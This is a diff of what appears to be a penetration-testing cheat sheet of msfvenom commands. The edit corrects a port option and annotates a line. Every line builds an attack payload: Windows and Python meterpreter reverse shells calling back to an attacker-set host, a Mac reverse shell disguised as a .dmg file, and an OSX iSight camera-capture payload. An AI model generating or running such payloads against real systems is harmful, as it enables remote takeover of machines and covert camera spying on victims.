@@ -10,8 +10,8 @@ The advantages of msfvenom are:
 [Creating a Payload]
 
 - msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python :: Windows
-- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> PORT=4444 -f exe > shell.exe  :: Windows
-- msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=443 > pyterpreter.py :: MAC OS X
+- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe  :: Windows
+- msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.4 LPORT=443 > pyterpreter.py :: MAC OS X  - 100%
 - msfvenom -a x86 --platform OSX -p osx/x86/isight/bind_tcp -b "\x00" -f elf -o /tmp/osxt2 :: Mac OS X
 - msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.4  LPORT=4444 -f macho > osx_cam.dmg 
 - msfvenom -a x86 --platform windows -p windows/messagebox TEXT="MSFU Example" -f raw > messageBox
